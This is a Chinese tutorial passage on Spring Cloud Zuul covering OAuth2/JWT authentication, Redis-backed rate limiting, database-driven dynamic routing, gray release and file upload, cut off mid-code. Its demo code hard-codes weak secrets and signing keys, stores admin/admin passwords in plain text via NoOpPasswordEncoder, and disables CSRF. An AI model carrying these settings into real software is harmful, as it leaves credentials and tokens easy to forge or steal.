通常由三部分组成： Header 头部：指定 JWT 使用的签名算法 Payload 载荷：包含一些自定义与非自定义的认证信息 Signature 签名：将头部与载荷使用 . 连接之后，使用头部的签名算法生成签名信息并拼装到末尾 OAuth2.0 + JWT 的意义就在于，使用 0Auth2.0 协议的思想拉取认证生成 Token，使用 JWT 瞬时保存这个 Token，在客户端与资源端进行对称或非对称加密，使得这个规约具有定时、定量的授权认证功能，从而免去 Token 存储所带来的安全或系统扩展问题。 OAuth2.0 + JWT 实战下面模拟 Zuul 结合 OAuth2.0 + JWT 的实际应用，点击下载完整的示例代码。 编写 zuul-serverzuul-server 中需要做的就是当请求接口时，判断是否登录，如果未登录，则跳转到 auth-server 的登录界面（这里使用的是 Spring Security OAuth 的默认登录界面，也可以重写相关代码定制页面)，登录成功后 auth-server 颁发 jwt token，zuul-server 在访问下游服务时将 jwt token 放入 header 中即可。 zuul-server 的 pom.xml 文件： 12345678910111213141516&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-security&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-oauth2&lt;/artifactId&gt;&lt;/dependency&gt; zuul-server 的 application.yml 文件： 123456789101112131415161718192021222324252627282930server: port: 8092spring: application: name: zuul-servereureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: truezuul: routes: provider-service: path: /provider/service/** serviceId: provider-servicesecurity: oauth2: client: access-token-uri: http://127.0.0.1:8091/uaa/oauth/token #令牌端点 user-authorization-uri: http://127.0.0.1:8091/uaa/oauth/authorize #授权端点 client-id: zuul_server #OAuth2客户端ID client-secret: secret #OAuth2客户端密钥 resource: jwt: key-value: springcloud123 #指定密钥，使用对称加密方式，默认算法为HS256 在 zuul-server 里重写 WebSecurityConfigurerAdapter 适配器的 configure(HttpSecurity http) 方法，声明需要鉴权的 URL 信息 1234567891011121314151617@Component@EnableOAuth2Ssopublic class WebSecurityConfiguration extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http .authorizeRequests() .antMatchers("/login", "/provider/service/**") .permitAll() .anyRequest() .authenticated() .and() .csrf() .disable(); }} 编写 auth-serverauth-server 是整个示例的 另一个核心，作为认证授权中心，用于颁发 jwt token 凭证。 auth-server 的 pom.xml 文件： 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-oauth2&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt; auth-server 的 application.xml 文件： 123456789101112131415server: port: 8091 servlet: context-path: /uaaspring: application: name: auth-servereureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true 在 auth-server 里编写认证授权服务适配类 OauthConfigruatrion，主要用于指定客户端 ID、密钥，以及权限定义与作用域声明，指定 TokenStore 为 JWT，不同于以往将 TokenStore 指定为 Redis 或是其他持久化工具： 123456789101112131415161718192021222324252627282930313233343536373839@Configuration@EnableAuthorizationServerpublic class OauthConfigruatrion extends AuthorizationServerConfigurerAdapter { @Autowired private AuthenticationManager authenticationManager; @Override public void configure(ClientDetailsServiceConfigurer clients) throws Exception { clients .inMemory() .withClient("zuul_server") .secret("secret") .scopes("WRIGTH", "read") .autoApprove(true) .authorities("WRIGTH_READ", "WRIGTH_WRITE") .authorizedGrantTypes("implicit", "refresh_token", "password", "authorization_code"); } @Override public void configure(AuthorizationServerEndpointsConfigurer endpoints) throws Exception { endpoints .tokenStore(jwtTokenStore()) .tokenEnhancer(jwtTokenConverter()) .authenticationManager(authenticationManager); } @Bean public TokenStore jwtTokenStore() { return new JwtTokenStore(jwtTokenConverter()); } @Bean protected JwtAccessTokenConverter jwtTokenConverter() { JwtAccessTokenConverter converter = new JwtAccessTokenConverter(); converter.setSigningKey("springcloud123"); return converter; }} 在 auth-server 里编写安全配置类 WebSecurityConfiguration，主要声明用户 admin 具有读写权限，用户 guest 具有读权限，passwordEncoder() 用于声明用户名和密码的加密方式，这个功能在 Spring Security 5.0 之前是没有的。 1234567891011121314151617181920212223@Configurationpublic class WebSecurityConfiguration extends WebSecurityConfigurerAdapter { @Override @Bean(name = BeanIds.AUTHENTICATION_MANAGER) public AuthenticationManager authenticationManager() throws Exception { return super.authenticationManager(); } @Override protected void configure(AuthenticationManagerBuilder auth) throws Exception { auth .inMemoryAuthentication() .withUser("guest").password("guest").authorities("WRIGTH_READ") .and() .withUser("admin").password("admin").authorities("WRIGTH_READ", "WRIGTH_WRITE"); } @Bean public static NoOpPasswordEncoder passwordEncoder() { return (NoOpPasswordEncoder) NoOpPasswordEncoder.getInstance(); }} 编写 provider-serviceprovider-service 作为 zuul-server 的下游服务，需要的功能很简单，能够被注册发现，以及能够按照规贝解析 jwt token 即可。 provider-service 的 pom.xml 文件 123456789101112&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-security&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-oauth2&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt; provider-service 的 application.yml 文件： 12345678910111213server: port: 9090spring: application: name: provider-serviceeureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true 在 provider-service 里编写配置类 ResourceServerConfiguration： 123456789101112131415161718192021222324252627282930313233@Configuration@EnableResourceServerpublic class ResourceServerConfiguration extends ResourceServerConfigurerAdapter { @Override public void configure(HttpSecurity http) throws Exception { http .csrf().disable() .authorizeRequests() .antMatchers("/**").authenticated() .antMatchers(HttpMethod.GET, "/test") .hasAuthority("WRIGTH_READ"); } @Override public void configure(ResourceServerSecurityConfigurer resources) throws Exception { resources .resourceId("WRIGTH") .tokenStore(jwtTokenStore()); } @Bean public TokenStore jwtTokenStore() { return new JwtTokenStore(jwtTokenConverter()); } @Bean protected JwtAccessTokenConverter jwtTokenConverter() { JwtAccessTokenConverter converter = new JwtAccessTokenConverter(); converter.setSigningKey("springcloud123"); return converter; }} 在 provider-service 里编写测试类： 1234567891011121314151617@RestControllerpublic class TestController { private static final Logger logger = LoggerFactory.getLogger(TestController.class); @RequestMapping("/test") public String test(HttpServletRequest request) { logger.info("----------------header----------------"); Enumeration headerNames = request.getHeaderNames(); while (headerNames.hasMoreElements()) { String key = (String) headerNames.nextElement(); logger.info(key + ": " + request.getHeader(key)); } logger.info("----------------header----------------"); return "hello!"; }} 测试效果 在测试之前，整个示例的流程图在这里 依次启动 eureka-server、provider-service、auth-server、zuul-server 应用 访问 http://127.0.0.1:8092/provider/service/test，由于未授权，该接口会返回需要授权才能访问的提示信息，查看截图 访问 http://127.0.0.1:8092，会自动跳转到 auth-server 的默认登录页面（http://127.0.0.1:8091/uaa/login），输入用户名 admin 与 密码 admin 进行登录，查看截图 再次访问 http://127.0.0.1:8092/provider/service/test，调用接口成功，控制台的日志信息如下： 1234567891011121314151617181920----------------header----------------upgrade-insecure-requests: 1user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9sec-fetch-site: nonesec-fetch-mode: navigatesec-fetch-user: ?1sec-fetch-dest: documentaccept-language: en,zh-CN;q=0.9,zh;q=0.8authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1ODg2OTE4NzAsInVzZXJfbmFtZSI6ImFkbWluIiwiYXV0aG9yaXRpZXMiOlsiV1JJ ...x-forwarded-host: 127.0.0.1:8092x-forwarded-proto: httpx-forwarded-prefix: /provider/servicex-forwarded-port: 8092x-forwarded-for: 127.0.0.1accept-encoding: gzipcontent-length: 0host: 192.168.1.130:9090connection: Keep-Alive----------------header---------------- Zuul 限流构建一个自我修复型系统一直是各大企业进行架构设计的难点所在，在 Hystrix 中可以通过熔断器来实现，通过某个阈值来对异常流量进行降级处理。其实，除对异常流量进行降级处理之外，也可以做一些其他操作来保护系统免受 “雪崩之灾”，比如：流量 排队、限流、分流等。 限流算法说到限流算法，不自觉就想到了 “漏桶” 与 “令牌桶” 算法。诚然，两种限流的祖师级算法确有其独到之处，其他实现比如滑动时间窗或者三色速率标记法等，其实质还是 “漏桶” 与 “令牌桶” 的变种，要么是将 “漏桶” 容积换成了单位时间，要么是按规则将请求标记颜色进行处理，底层还是 “令牌” 的思想。所以，掌握 “漏桶” 与 “令牌桶” 算法原理，对理解其他限流算法有一定帮助。 漏桶（Leaky Bucket）算法漏桶的原型是一个底部有漏孔的桶，桶上方有一个入水口，水不断地流进桶内，桶下方的漏孔就会以一个相对恒定的速率漏水，在入大于岀的情况下，桶在一段时间之后就会被装满，这时候多余的水就会溢出；而在入小于出的情况下，漏桶则不起任何作用。后来将这个经典模型运用在网络流量整形上面，通过漏桶算法的约束，突发流量可以被整形为一个规整的流量（如图所示）。当请求或者具有一定体量的数据流涌来的时候，在漏桶的作用下，流量被整形，不能满足要求的部分被削减掉。所以，漏桶算法能够强制限定流量速率。注意，在企业应用中，这部分溢出的流量是可以被利用起来的，并非完全丢弃，可以把它们收集到一个队列里面，做流量排队，尽量做到合理利用所有资源。 令牌桶（Token Bucket）算法令牌桶算法和漏桶算法有点不一样，桶里面存放令牌，而令牌又是以一个恒定的速率被加入桶内，可以积压，可以溢出。当数据流涌来时，量化请求用于获取令牌，如果取到令牌则放行，同时桶内丢弃掉这个令牌；如果不能取到令牌，请求则被丢弃（如图所示）。由于令牌桶内可以存在一定数量的令牌，那么就可能存在一定程度的流量突发，这也是决定漏桶算法与令牌桶算法适用于不同应用场景的主要原因。 限流实战在 Zuul 中实现限流最简单的方式是使用自定义 Filter 加上相关限流算法，其中可能会考虑到 Zuul 的多节点部署，因为算法的原因，这时候需要一个 K/V 存储工具（推荐使用 Redis，充分利用 Redis 单线程的特性，可以有效避免多节点带来的一些问题)。当然如果 Zuul 是单节点应用，限流方式的选择就会广得多，完全可以将相关 prefix 放在内存之中，方便又快捷。这里介绍一个开箱即用的工具 spring-cloud-zuul-ratelimit，它是专门针对 Zuul 编写的限流库，提供了以下特性： 多种细粒度策略： 多种粒度临时变量存储方式： 父 Maven 工程的 pom.xml 文件，这里 Spring Cloud 的版本是 Hoxton.SR4，Spring Boot 的版本是 2.2.6.RELEASE，点击下载完整的示例代码。 1234567891011121314151617181920212223242526272829303132333435363738&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.2.6.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Hoxton.SR4&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--注意：这里需要添加以下配置，否则可能会有各种依赖问题 --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; zuul-server 里的 pom.xml 文件： 1234567891011121314151617&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.marcosbarbero.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-zuul-ratelimit&lt;/artifactId&gt; &lt;version&gt;2.4.0.RELEASE&lt;/version&gt;&lt;/dependency&gt; zuul-server 里的 application.yml 文件： 1234567891011121314151617181920212223242526272829303132333435server: port: 8092spring: application: name: zuul-server redis: host: 172.175.0.3 port: 6379 password:eureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: truezuul: routes: provider-service: path: /provider/service/** serviceId: provider-service ratelimit: enabled: true key-prefix: ratelimit repository: REDIS behind-proxy: true #表示代理之后 policy-list: provider-service: #单独细化到服务粒度 - limit: 2 #在一个单位时间窗口（秒）的请求数量 quota: 1 #在一个单位时间窗口（秒）的请求时间限制 refresh-interval: 3 #刷新时间（秒） type: - url #指定url粒度 zuul-server 里的启动主类： 123456789@EnableZuulProxy@EnableDiscoveryClient@SpringBootApplicationpublic class ZuulServerApplication { public static void main(String[] args) { SpringApplication.run(ZuulServerApplication.class, args); }} 测试效果： 依次启动 eureka-server、provider-service、zuul-server 应用 多次访问 http://127.0.0.1:8092/provider/service/provider/add?b=3，在时间窗阈值内访问接口时，接口会返回正确信息；一旦超限，后台会抛出 429 异常，接口返回对应的错误信息，查看截图 Zuul 动态路由动态路由概述Zuul 提供了各种映射规则的配置方式，这极大地增加了在构建应用时的选择余地，这些方式称为 “静态路由（Static Routing）”。一般来说，在微服务构建前期就已经按照业务把各种映射关系制定好了，但是在后期迭代过程中，一个复杂的系统难免经历新服务的上线过程，这个时候不能轻易停掉线上某些映射链路；那么问题就来了，Zuul 是在启动的时候将配置文件中的映射规则写入内存，要新建映射规则，只能修改了配置文件之后再重新启动 Zuul 应用。那能不能有一种方法，既能按需修改映射规则，又能使服务免于重启之痛呢？答案是有的，目前有如下两种解决方案实现 “动态路由（Dynamic Routing）”，通常采用第一种方式，这是 Spring Cloud 生态推崇的方式，但是也有它的局限性，有兴趣的读者可以查阅相关资料。 结合 Spring Cloud Config + Bus，动态刷新配置文件，这种方式的好处是不用 Zuul 维护映射规则，可以随时修改，随时生效；唯一不好的地方是需要单独集成一些使用并不频繁的组件，Config 没有可视化界面，维护起规则来也相对麻烦 重写 Zuul 的配置读取方式，釆用事件刷新机制，从数据库读取路由映射规则，此种方式因为基于数据库，可轻松实现管理界面，灵活度较高 动态路由实现原理剖析Zuul 动态路由实现的四个核心类： DiscoveryClientRouteLocator 类中的 locateRoutes() 方法继承自 SimpleRouteLocator 类并重写了规则，该方法主要的功能就是将配置文件中的映射规则信息包装成 LinkedHashMap&lt;String, ZuulRoute&gt;，键是映射路径，值是配置文件的封装类，以往所见的配置映射读取进来就是使用 ZuulRoute 来封装。refiresh() 实现自 RefreshableRouteLocator 接口，添加刷新功能必须要实现此方法，doRefresh() 方法来自 SimpleRouteLocator 类。 SimpleRouteLocator 该类是 DiscoveryClientRouteLocator 的父类，此类基本实现了 RouteLocator 接口，对读取的配置文件信息做一些基本处理，提供了方法 doRefresh() 与 locateRoutes() 供子类实现刷新策略与映射规则加载策略，两个方法都是使用 protected 修饰，是为了让子类不用维护此类一些成员变量就能够实现刷新或者读取路由的功能。 ZuulServerAutoConfiguration 在低版本的 Spring Cloud Zuul 中，这个类叫作 ZuulConfiguration，位于 org.springframework. cloud.netflix.zuul 包中，主要目的是注册各种过滤器、监听器以及其他功能。Zuul 在注册中心新增服务后刷新监听器也是在此注册的，底层是采用 Spring 的 ApplicationListener 来实现。由方法 onApplicationEvent(ApplicationEvent event) 可知，Zuul 会接收 3 种事件通知（ContextRefreshedEvent、RefreshScopeRefreshedEvent、RoutesRefreshedEvent）去刷新路由映射配置信息，此外心跳续约监视器 HeartbeatMonitor 也会触发这个动作。 ZuulHandlerMapping 此类是将本地配置的映射关系映射到远程的过程控制器，与事件刷新相关的代码。类里的 dirty 属性很重要，它是用来控制当前是否需要重新加载映射配置信息的标记，在 Zuul 每次进行路由操作的时候都会检査这个值，如果为 true，就会触发配置信息的重新加载，同时再将其回设为 false。由 setDirty(boolean dirty) 可知，启动刷新动作必须要实现 RefreshableRouteLocator 接口。 原理总结 在构建动态路由的时候，只需要重写 SimpleRouteLocator 类的 locateRoutes() 方法，并且实现 RefreshableRouteLocator 接口的 refresh() 方法，再在内部调用 SimpleRouteLocator 类的 doRefresh() 方法，就可以构建起一个由 Zuul 内部事件触发的自定义动态路由加载器。如果不想使用内部事件触发配置更新操作，改为手动触发，可以重写 onApplicationEvent(ApplicationEvent event) 方法，事实上手动触发的控制性更好。 基于 DB 的动态路由实战下面做一个实战例子，这里的 DB 暂且选用 MySQL，当然也可以选择其他持久化方式，目的是方便，易于管理，实际上选用 MongoDB 也是一种不错的选择，点击下载完整的示例代码。 存储映射规则的数据库表设计： zuul-server 的 pom.xml 文件： 12345678910111213141516&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt;&lt;/dependency&gt; zuul-server 的 application.yml 文件，如果需要防止服务侵入，这里可以将 ribbon.eureka.enabled 设置为 false： 12345678910111213141516171819202122server: port: 8092spring: application: name: zuul-server datasource: url: jdbc:mysql://localhost:3306/zuul-test?useUnicode=true&amp;characterEncoding=utf-8 driver-class-name: com.mysql.jdbc.Driver username: root password: 123456eureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: trueribbon: eureka: enabled: true 在 zuul-server 里编写 DAO 类，从数据库读取路由配置信息： 12345678910111213141516171819202122@Componentpublic class PropertiesDao { @Autowired private JdbcTemplate jdbcTemplate; private final static String SQL = "SELECT * FROM zuul_route WHERE enabled = TRUE"; public Map&lt;String, ZuulProperties.ZuulRoute&gt; getProperties() { Map&lt;String, ZuulProperties.ZuulRoute&gt; routes = new LinkedHashMap&lt;&gt;(); List&lt;ZuulRouteEntity&gt; list = jdbcTemplate.query(SQL, new BeanPropertyRowMapper&lt;&gt;(ZuulRouteEntity.class)); list.forEach(entity -&gt; { if (StringUtils.isEmpty(entity.getPath())) { return; } ZuulProperties.ZuulRoute zuulRoute = new ZuulProperties.ZuulRoute(); BeanUtils.copyProperties(entity, zuulRoute); routes.put(zuulRoute.getPath(), zuulRoute); }); return routes; }} 在 zuul-server 里编写自定义路由配置加载器类，该类是改造的核心类，locateRoutes() 方法从数据库加载配置信息，并且配合 Zuul 内部事件刷新机制，实际上每次心跳续约都会触发路由配置重新加载的操作，如果需要改为手动触发，可参考上面的动态路由实现原理剖析： 12345678910111213141516171819202122232425262728293031323334353637383940public class DynamicZuulRouteLocator extends SimpleRouteLocator implements RefreshableRouteLocator { @Autowired private ZuulProperties properties; @Autowired private PropertiesDao propertiesDao; public DynamicZuulRouteLocator(String servletPath, ZuulProperties properties) { super(servletPath, properties); this.properties = properties; } @Override public void refresh() { doRefresh(); } @Override protected Map&lt;String, ZuulRoute&gt; locateRoutes() { LinkedHashMap&lt;String, ZuulRoute&gt; routesMap = new LinkedHashMap&lt;&gt;(); routesMap.putAll(super.locateRoutes()); routesMap.putAll(propertiesDao.getProperties()); LinkedHashMap&lt;String, ZuulRoute&gt; values = new LinkedHashMap&lt;&gt;(); routesMap.forEach((key, value) -&gt; { String path = key; if (!path.startsWith("/")) { path = "/" + path; } if (StringUtils.hasText(this.properties.getPrefix())) { path = this.properties.getPrefix() + path; if (!path.startsWith("/")) { path = "/" + path; } } values.put(path, value); }); return values; }} 在 zuul-server 编写配置类，让上面的自定义路由配置加载器生效： 123456789101112131415@Configurationpublic class DynamicZuulConfig { @Autowired private ZuulProperties zuulProperties; @Autowired private ServerProperties serverProperties; @Bean public DynamicZuulRouteLocator routeLocator() { DynamicZuulRouteLocator routeLocator = new DynamicZuulRouteLocator(serverProperties.getServlet().getServletPrefix(), zuulProperties); return routeLocator; }} 测试效果： 依次启动 eureka-server、provider-service、zuul-server 应用 访问 http://127.0.0.1:8092/provider/service/provider/add?b=3，查看接口调用的结果 访问 http://127.0.0.1:8092/provider-service/provider/add?b=3，查看接口调用的结果 访问 http://127.0.0.1:8092/baidu，查看是否跳转到百度的首页 Zuul 灰度发布灰度发布概述灰度发布，是指在系统迭代新功能时的一种平滑过渡的上线发布方式。灰度发布是在原有系统的基础上，额外增加一个新版本，这个新版本包含需要待验证的新功能，随后用负载均衡器引入一小部分流量到这个新版本应用，如果整个过程没有出现任何差错，再平滑地把线上系统或服务一步步替换成新版本，至此完成了一次灰度发布。这种发布方式由于可以在用户无感知的情况下完成产品的升级，在许多公司都有较为成熟的解决方案。对于 Spring Cloud 微服务生态来说，粒度一般是一个服务，往往通过使用某些带有特定标记的流量来充当灰度发布过程中的 “小白鼠”，并且目前已经有比较好的开源项目来做这个事情。 灰度发布实战灰度发布有很多种实现方式，这里要讲的是基于 Eureka 元数据（metadata）的一种方式，它的原理是通过获取 Eureka 实例信息，并鉴别元数据的含义，再分别进行路由规则下的负载均衡，点击下载完整的示例代码。 其中在 Eureka 里面，一共有两种元数据： 标准元数据：这种元数据是服务的各种注册信息，比如 IP、端口、服务健康信息、续约信息等，存储于专门为服务开辟的注册表中，用于其他组件取用以实现整个微服务生态 自定义元数据：自定义元数据是使用 eureka.instance.metadata-map.&lt;key&gt;=&lt;value&gt; 来配置的，其内部其实就是维护了一个 Map 来保存自定义元数据信息，可以配置在服务提供者端，随服务一并注册保存在 Eureka 的注册表中，对微服务生态的任何行为都没有影响，除非知道其特定的含义 首先编写 provider-service、provider-service-2、provider-service-3 应用，9090 与 9091 端口运行的是稳定的线上服务，将它们的 host-mark 设置成 running-host，需要上线的灰度服务的端口为 9092，host-mark 为 gray-host，最后要达成的效果是：由于服务名称都为 provider-service，但是在某一个值的作用下，部分请求被分发到 9090 与 9091 实例上，也就是 host-mark 为 running-host 的节点；另一部分则分发到 9092 实例，host-mark 为 gray-host 的节点。 provider-service 的 application.yml 文件： 123456789101112131415server: port: 9090spring: application: name: provider-serviceeureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true metadata-map: host-mark: running-host provider-service-2 的 application.yml 文件： 123456789101112131415server: port: 9091spring: application: name: provider-serviceeureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true metadata-map: host-mark: running-host provider-service-3 的 application.yml 文件： 123456789101112131415server: port: 9092spring: application: name: provider-serviceeureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true metadata-map: host-mark: gray-host 在 zuul-server 中的 pom.xml 文件里，引入开源项目 ribbon-discovery-filter-spring-cloud-starter，该项目提供了一种基于 metadata 的负载均衡机制： 12345678910111213&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.jmnarloch&lt;/groupId&gt; &lt;artifactId&gt;ribbon-discovery-filter-spring-cloud-starter&lt;/artifactId&gt; &lt;version&gt;2.1.0&lt;/version&gt;&lt;/dependency&gt; 在 zuul-server 里创建自定义的过滤器，此过滤器的作用是将 header 里面的 gray-mark 作为指标，如果 gray-mark 等于 enable 的话，就将该请求路由到灰度节点 gray-host，如果不等于或者没有这个指标就路由到其他节点。RibbonFilterContextHolder 是该项目的一个核心类，它定义了基于 metadata 的一种负载均衡机制 123456789101112131415161718192021222324252627282930public class GrayPublishFilter extends ZuulFilter { @Override public String filterType() { return PRE_TYPE; } @Override public int filterOrder() { return PRE_DECORATION_FILTER_ORDER - 1; } @Override public boolean shouldFilter() { RequestContext ctx = RequestContext.getCurrentContext(); return !ctx.containsKey(FORWARD_TO_KEY) &amp;&amp; !ctx.containsKey(SERVICE_ID_KEY); } @Override public Object run() throws ZuulException { HttpServletRequest request = RequestContext.getCurrentContext().getRequest(); String mark = request.getHeader("gray-mark"); if (!StringUtils.isEmpty(mark) &amp;&amp; "enable".equals(mark)) { RibbonFilterContextHolder.getCurrentContext().add("host-mark", "gray-host"); } else { RibbonFilterContextHolder.getCurrentContext().add("host-mark", "running-host"); } return null; }} 在 zuul-server 里创建配置类： 12345678@Configurationpublic class CommonConfiguration { @Bean public GrayPublishFilter grayPublishFilter() { return new GrayPublishFilter(); }} 在 zuul-server 里创建启动主类： 123456789@EnableZuulProxy@EnableDiscoveryClient@SpringBootApplicationpublic class ZuulServerApplication { public static void main(String[] args) { SpringApplication.run(ZuulServerApplication.class, args); }} 测试效果： 依次启动 eureka-server、provider-service、provider-service-2、provider-service-3、zuul-server 应用 header 不加 gray-mark=enable，访问 http://127.0.0.1:8092/provider/service/provider/add?b=3，请求只会路由到 9090 与 9091 端口的 provider-service 服务上（默认轮询） header 加上 gray-mark=enable，访问 http://127.0.0.1:8092/provider/service/provider/add?b=3，无论请求多少次，请求都会路由到 9092 端口的 provider-service 服务上 Zuul 文件上传文件上传的场景，很多开发者都会遇到，Zuul 作为一个网关中间件，自然也会面临文件上传的考验。Zuul 的文件上传功能是从 Spring Boot 承袭过来的，所以也需要 Spring Boot 的相关配置，点击下载完整的示例代码。 文件上传实战zuul-server 的 pom.xml 文件，为了上传测试方便，另外引入了 Swagger2： 123456789101112131415161718&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt; zuul-server 的 application.yml 文件： 12345678910111213141516171819202122232425262728293031323334353637383940server: port: 8092spring: application: name: zuul-server servlet: multipart: enabled: true #使用http multipart上传处理 max-file-size: 100MB #设置单个文件的最大长度，默认1M，如不限制配置为-1 max-request-size: 100MB #设置最大的请求文件的大小，默认10M，如不限制配置为-1 file-size-threshold: 1MB #当上传文件达到1MB的时候进行磁盘写入 location: /tmp #上传的临时目录eureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: truezuul: routes: provider-service: path: /provider/service/** serviceId: provider-service##### 设置Ribbon的超时时间，如果要上传大文件，为避免超时，稍微设大一点ribbon: ConnectTimeout: 3000 ReadTimeout: 30000##### Hystrix默认超时时间为1秒，如果要上传大文件，为避免超时，稍微设大一点hystrix: command: default: execution: isolation: thread: timeoutInMilliseconds: 30000 在 zuul-server 里编写 Swagger2 的配置类： 123456789101112131415161718@Configuration@EnableSwagger2public class Swagger2Config { @Bean public Docket createRestApi() { return new Docket(DocumentationType.SWAGGER_2).apiInfo(apiInfo()).select() .apis(RequestHandlerSelectors.basePackage("com.springcloud.study.controller")) .paths(PathSelectors.any()).build(); } private ApiInfo apiInfo() { return new ApiInfoBuilder() .title("Zuul文件上传") .description("Zuul文件上传") .version("1.0").build(); }} 在 zuul-server 里编写文件上传的测试类： 12345678910111213141516171819@RestController@Api("Zuul文件上传")public class UploadController { public static final 